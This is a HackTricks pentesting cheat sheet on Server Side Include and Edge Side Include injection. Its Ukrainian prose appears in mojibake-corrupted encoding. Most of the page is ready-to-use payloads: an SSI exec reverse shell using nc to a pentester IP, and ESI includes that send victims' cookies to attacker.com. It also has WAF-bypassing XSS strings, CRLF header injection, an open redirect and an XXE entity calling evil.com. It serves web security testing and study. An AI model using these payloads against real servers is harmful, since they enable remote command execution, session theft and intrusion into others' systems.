# Server Side Inclusion/Edge Side Inclusion Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Server Side Inclusion Basic Information

**(Introduction taken from [Apache docs](https://httpd.apache.org/docs/current/howto/ssi.html))**

SSI (Server Side Includes) - —Ü–µ –¥–∏—Ä–µ–∫—Ç–∏–≤–∏, —è–∫—ñ **—Ä–æ–∑–º—ñ—â—É—é—Ç—å—Å—è –≤ HTML-—Å—Ç–æ—Ä—ñ–Ω–∫–∞—Ö —ñ –æ—Ü—ñ–Ω—é—é—Ç—å—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ** –ø—ñ–¥ —á–∞—Å —ó—Ö –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—è. –í–æ–Ω–∏ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –≤–∞–º **–¥–æ–¥–∞–≤–∞—Ç–∏ –¥–∏–Ω–∞–º—ñ—á–Ω–æ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç** –¥–æ —ñ—Å–Ω—É—é—á–æ—ó HTML-—Å—Ç–æ—Ä—ñ–Ω–∫–∏, –Ω–µ –æ–±—Å–ª—É–≥–æ–≤—É—é—á–∏ –≤—Å—é —Å—Ç–æ—Ä—ñ–Ω–∫—É —á–µ—Ä–µ–∑ CGI-–ø—Ä–æ–≥—Ä–∞–º—É –∞–±–æ —ñ–Ω—à—É –¥–∏–Ω–∞–º—ñ—á–Ω—É —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—é.\
–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∏ –º–æ–∂–µ—Ç–µ —Ä–æ–∑–º—ñ—Å—Ç–∏—Ç–∏ –¥–∏—Ä–µ–∫—Ç–∏–≤—É –≤ —ñ—Å–Ω—É—é—á—ñ–π HTML-—Å—Ç–æ—Ä—ñ–Ω—Ü—ñ, —Ç–∞–∫—É —è–∫:

`<!--#echo var="DATE_LOCAL" -->`

–Ü, –∫–æ–ª–∏ —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –æ–±—Å–ª—É–≥–æ–≤—É—î—Ç—å—Å—è, —Ü–µ–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç –±—É–¥–µ –æ—Ü—ñ–Ω–µ–Ω–∏–π —ñ –∑–∞–º—ñ–Ω–µ–Ω–∏–π –Ω–∞ –π–æ–≥–æ –∑–Ω–∞—á–µ–Ω–Ω—è:

`Tuesday, 15-Jan-2013 19:28:54 EST`

–†—ñ—à–µ–Ω–Ω—è –ø—Ä–æ —Ç–µ, –∫–æ–ª–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ SSI, –∞ –∫–æ–ª–∏ –ø–æ–≤–Ω—ñ—Å—Ç—é –≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –≤–∞—à—É —Å—Ç–æ—Ä—ñ–Ω–∫—É —è–∫–æ—é—Å—å –ø—Ä–æ–≥—Ä–∞–º–æ—é, –∑–∞–∑–≤–∏—á–∞–π –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ —Ç–æ–≥–æ, —Å–∫—ñ–ª—å–∫–∏ –∑ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ —î —Å—Ç–∞—Ç–∏—á–Ω–∏–º, –∞ —Å–∫—ñ–ª—å–∫–∏ –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–µ—Ä–µ—Ä–∞—Ö–æ–≤—É–≤–∞—Ç–∏ —â–æ—Ä–∞–∑—É, –∫–æ–ª–∏ —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –æ–±—Å–ª—É–≥–æ–≤—É—î—Ç—å—Å—è. SSI - —Ü–µ —á—É–¥–æ–≤–∏–π —Å–ø–æ—Å—ñ–± –¥–æ–¥–∞—Ç–∏ –Ω–µ–≤–µ–ª–∏–∫—ñ —à–º–∞—Ç–∫–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ –ø–æ—Ç–æ—á–Ω–∏–π —á–∞—Å - –ø–æ–∫–∞–∑–∞–Ω–æ –≤–∏—â–µ. –ê–ª–µ —è–∫—â–æ –±—ñ–ª—å—à—ñ—Å—Ç—å –≤–∞—à–æ—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –≥–µ–Ω–µ—Ä—É—î—Ç—å—Å—è –≤ –º–æ–º–µ–Ω—Ç —ó—ó –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—è, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —à—É–∫–∞—Ç–∏ —ñ–Ω—à–µ —Ä—ñ—à–µ–Ω–Ω—è.

–í–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ –≤–∏—Å–Ω–æ–≤–æ–∫ –ø—Ä–æ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å SSI, —è–∫—â–æ –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ñ–∞–π–ª–∏ –∑ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º–∏ \*\* `.shtml`, `.shtm` –∞–±–æ `.stm`\*\*, –∞–ª–µ —Ü–µ –Ω–µ —î —î–¥–∏–Ω–∏–º –≤–∏–ø–∞–¥–∫–æ–º.

–¢–∏–ø–æ–≤–∏–π –≤–∏—Ä–∞–∑ SSI –º–∞—î –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Ñ–æ—Ä–º–∞—Ç:
```
<!--#directive param="value" -->
```
### –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Edge Side Inclusion

–Ñ –ø—Ä–æ–±–ª–µ–º–∞ **–∫–µ—à—É–≤–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∞–±–æ –¥–∏–Ω–∞–º—ñ—á–Ω–∏—Ö –¥–æ–¥–∞—Ç–∫—ñ–≤**, –æ—Å–∫—ñ–ª—å–∫–∏ —á–∞—Å—Ç–∏–Ω–∞ –∫–æ–Ω—Ç–µ–Ω—Ç—É –º–æ–∂–µ **–≤–∞—Ä—ñ—é–≤–∞—Ç–∏—Å—è** –¥–ª—è –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –∫–æ–Ω—Ç–µ–Ω—Ç—É. –°–∞–º–µ –¥–ª—è —Ü—å–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è **ESI**, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–µ–≥—ñ–≤ ESI **–¥–∏–Ω–∞–º—ñ—á–Ω–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç, —è–∫–∏–π –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏** –ø–µ—Ä–µ–¥ –≤—ñ–¥–ø—Ä–∞–≤–∫–æ—é –∫–µ—à–æ–≤–∞–Ω–æ—ó –≤–µ—Ä—Å—ñ—ó.\
–Ø–∫—â–æ **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫** –∑–º–æ–∂–µ **–≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ —Ç–µ–≥ ESI** –≤—Å–µ—Ä–µ–¥–∏–Ω—É –∫–µ—à–æ–≤–∞–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É, —Ç–æ–¥—ñ –≤—ñ–Ω –∑–º–æ–∂–µ **–≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç** —É –¥–æ–∫—É–º–µ–Ω—Ç –ø–µ—Ä–µ–¥ –π–æ–≥–æ –≤—ñ–¥–ø—Ä–∞–≤–∫–æ—é –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º.

### ESI Detection

–ù–∞—Å—Ç—É–ø–Ω–∏–π **–∑–∞–≥–æ–ª–æ–≤–æ–∫** —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –≤—ñ–¥ —Å–µ—Ä–≤–µ—Ä–∞ –æ–∑–Ω–∞—á–∞—î, —â–æ —Å–µ—Ä–≤–µ—Ä –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î ESI:
```
Surrogate-Control: content="ESI/1.0"
```
–Ø–∫—â–æ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ü–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫, —Å–µ—Ä–≤–µ—Ä **–º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ ESI –≤ –±—É–¥—å-—è–∫–æ–º—É –≤–∏–ø–∞–¥–∫—É**.\
**–ú–æ–∂–Ω–∞ —Ç–∞–∫–æ–∂ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø—ñ–¥—Ö—ñ–¥ —Å–ª—ñ–ø–æ—ó –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó**, –æ—Å–∫—ñ–ª—å–∫–∏ –∑–∞–ø–∏—Ç –º–∞—î –Ω–∞–¥—ñ–π—Ç–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∞—Ç–∞–∫—É—é—á–æ–≥–æ:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

[GoSecure —Å—Ç–≤–æ—Ä–∏–≤](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) —Ç–∞–±–ª–∏—Ü—é –¥–ª—è —Ä–æ–∑—É–º—ñ–Ω–Ω—è –º–æ–∂–ª–∏–≤–∏—Ö –∞—Ç–∞–∫, —è–∫—ñ –º–∏ –º–æ–∂–µ–º–æ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –ø—Ä–æ—Ç–∏ —Ä—ñ–∑–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è, —â–æ –ø—ñ–¥—Ç—Ä–∏–º—É—î ESI, –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω–æ—ó —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—ñ:

* **Includes**: –ü—ñ–¥—Ç—Ä–∏–º—É—î –¥–∏—Ä–µ–∫—Ç–∏–≤—É `<esi:includes>`
* **Vars**: –ü—ñ–¥—Ç—Ä–∏–º—É—î –¥–∏—Ä–µ–∫—Ç–∏–≤—É `<esi:vars>`. –ö–æ—Ä–∏—Å–Ω–æ –¥–ª—è –æ–±—Ö–æ–¥—É XSS —Ñ—ñ–ª—å—Ç—Ä—ñ–≤
* **Cookie**: –î–æ–∫—É–º–µ–Ω—Ç–Ω—ñ –∫—É–∫–∏ –¥–æ—Å—Ç—É–ø–Ω—ñ –¥–ª—è ESI –¥–≤–∏–≥—É–Ω–∞
* **Upstream Headers Required**: –°—É—Ä–æ–≥–∞—Ç–Ω—ñ –ø—Ä–æ–≥—Ä–∞–º–∏ –Ω–µ –æ–±—Ä–æ–±–ª—è—Ç–∏–º—É—Ç—å ESI —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó, —è–∫—â–æ upstream –ø—Ä–æ–≥—Ä–∞–º–∞ –Ω–µ –Ω–∞–¥–∞—î –∑–∞–≥–æ–ª–æ–≤–∫–∏
* **Host Allowlist**: –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É ESI –≤–∫–ª—é—á–µ–Ω–Ω—è –º–æ–∂–ª–∏–≤—ñ –ª–∏—à–µ –∑ –¥–æ–∑–≤–æ–ª–µ–Ω–∏—Ö —Å–µ—Ä–≤–µ—Ä–Ω–∏—Ö —Ö–æ—Å—Ç—ñ–≤, —â–æ —Ä–æ–±–∏—Ç—å SSRF, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –º–æ–∂–ª–∏–≤–∏–º –ª–∏—à–µ –ø—Ä–æ—Ç–∏ —Ü–∏—Ö —Ö–æ—Å—Ç—ñ–≤

|         **–ü—Ä–æ–≥—Ä–∞–º–Ω–µ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :-----------------------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|                  Squid3                     |      –¢–∞–∫     |    –¢–∞–∫   |     –¢–∞–∫     |              –¢–∞–∫              |         –ù—ñ         |
|               Varnish Cache                 |      –¢–∞–∫     |    –ù—ñ    |      –ù—ñ     |              –¢–∞–∫              |         –¢–∞–∫        |
|                  Fastly                     |      –¢–∞–∫     |    –ù—ñ    |      –ù—ñ     |               –ù—ñ              |         –¢–∞–∫        |
| Akamai ESI Test Server (ETS)                |      –¢–∞–∫     |    –¢–∞–∫   |     –¢–∞–∫     |               –ù—ñ              |         –ù—ñ         |
|                NodeJS esi                   |      –¢–∞–∫     |    –¢–∞–∫   |     –¢–∞–∫     |               –ù—ñ              |         –ù—ñ         |
|               NodeJS nodesi                 |      –¢–∞–∫     |    –ù—ñ    |      –ù—ñ     |               –ù—ñ              |      –ù–µ–æ–±–æ–≤'—è–∑–∫–æ–≤–æ |

#### XSS

–ù–∞—Å—Ç—É–ø–Ω–∞ ESI –¥–∏—Ä–µ–∫—Ç–∏–≤–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å –¥–æ–≤—ñ–ª—å–Ω–∏–π —Ñ–∞–π–ª –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ —Å–µ—Ä–≤–µ—Ä–∞
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### –û–±—Ö—ñ–¥ –∑–∞—Ö–∏—Å—Ç—É XSS –∫–ª—ñ—î–Ω—Ç–∞
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### –í–∫—Ä–∞—Å—Ç–∏ Cookie

* –í—ñ–¥–¥–∞–ª–µ–Ω–µ –≤–∫—Ä–∞–¥–µ–Ω–Ω—è cookie
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* –í–∫—Ä–∞—Å—Ç–∏ cookie HTTP\_ONLY –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é XSS, –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—á–∏ –π–æ–≥–æ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### –ü—Ä–∏–≤–∞—Ç–Ω–∏–π –ª–æ–∫–∞–ª—å–Ω–∏–π —Ñ–∞–π–ª

–ù–µ –ø–ª—É—Ç–∞–π—Ç–µ —Ü–µ –∑ "–õ–æ–∫–∞–ª—å–Ω–∏–º –≤–∫–ª—é—á–µ–Ω–Ω—è–º —Ñ–∞–π–ª—ñ–≤":
```markup
<esi:include src="secret.txt">
```
#### CRLF
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Open Redirect

–ù–∞—Å—Ç—É–ø–Ω–µ –¥–æ–¥–∞—Å—Ç—å –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Location` –¥–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### –î–æ–¥–∞—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫

* –î–æ–¥–∞—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ —É –ø—Ä–∏–º—É—Å–æ–≤–∏–π –∑–∞–ø–∏—Ç
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* –î–æ–¥–∞—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—å (–∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è –æ–±—Ö–æ–¥—É "Content-Type: text/json" —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑ XSS)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF –≤ –∑–∞–≥–æ–ª–æ–≤–∫—É Add (**CVE-2019-2438**)
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai debug

–¶–µ –Ω–∞–¥—ñ—à–ª–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –¥–ª—è –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è, –≤–∫–ª—é—á–µ–Ω—É —É –≤—ñ–¥–ø–æ–≤—ñ–¥—å:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

–í–∫–∞–∑—É—é—á–∏ –∑–Ω–∞—á–µ–Ω–Ω—è `xslt` –¥–ª—è –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ _dca_, –º–æ–∂–ª–∏–≤–æ –≤–∫–ª—é—á–∏—Ç–∏ **`eXtensible Stylesheet Language Transformations (XSLT)`** –Ω–∞ –æ—Å–Ω–æ–≤—ñ ESI. –í–∫–ª—é—á–µ–Ω–Ω—è –∑–º—É—à—É—î HTTP —Å—É—Ä–æ–≥–∞—Ç –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ XML —Ç–∞ XSLT —Ñ–∞–π–ª–∏, –ø—Ä–∏ —Ü—å–æ–º—É –æ—Å—Ç–∞–Ω–Ω—ñ–π —Ñ—ñ–ª—å—Ç—Ä—É—î –ø–µ—Ä—à–∏–π. –¢–∞–∫—ñ XML —Ñ–∞–π–ª–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –∞—Ç–∞–∫ _XML External Entity (XXE)_, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∞—Ç–∞–∫–∏ SSRF. –û–¥–Ω–∞–∫ –∫–æ—Ä–∏—Å–Ω—ñ—Å—Ç—å —Ü—å–æ–≥–æ –ø—ñ–¥—Ö–æ–¥—É –æ–±–º–µ–∂–µ–Ω–∞, –æ—Å–∫—ñ–ª—å–∫–∏ ESI –≤–∂–µ —Å–ª—É–∂–∏—Ç—å –≤–µ–∫—Ç–æ—Ä–æ–º SSRF. –ß–µ—Ä–µ–∑ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –≤ –æ—Å–Ω–æ–≤–Ω—ñ–π –±—ñ–±–ª—ñ–æ—Ç–µ—Ü—ñ Xalan –∑–æ–≤–Ω—ñ—à–Ω—ñ DTD –Ω–µ –æ–±—Ä–æ–±–ª—è—é—Ç—å—Å—è, —â–æ –∑–∞–ø–æ–±—ñ–≥–∞—î –≤–∏—Ç–æ–∫—É –ª–æ–∫–∞–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤.
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
–§–∞–π–ª XSLT:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Å—Ç–æ—Ä—ñ–Ω–∫—É XSLT:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## –°–ø–∏—Å–æ–∫ –≤–∏—è–≤–ª–µ–Ω–Ω—è –±—Ä—É—Ç—Ñ–æ—Ä—Å—É

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
